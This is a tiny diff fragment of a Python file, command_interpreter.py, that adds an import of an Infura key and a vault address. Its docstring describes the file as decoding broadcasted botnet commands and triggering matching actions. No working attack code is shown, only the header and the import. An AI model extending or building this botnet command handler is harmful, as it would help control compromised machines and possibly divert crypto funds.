@@ -1,3 +1,4 @@
+from ghost_env import INFURA_KEY, VAULT_ADDRESS
 # === command_interpreter.py ===
 """
 Command Interpreter – Decodes broadcasted botnet commands and triggers matching actions.
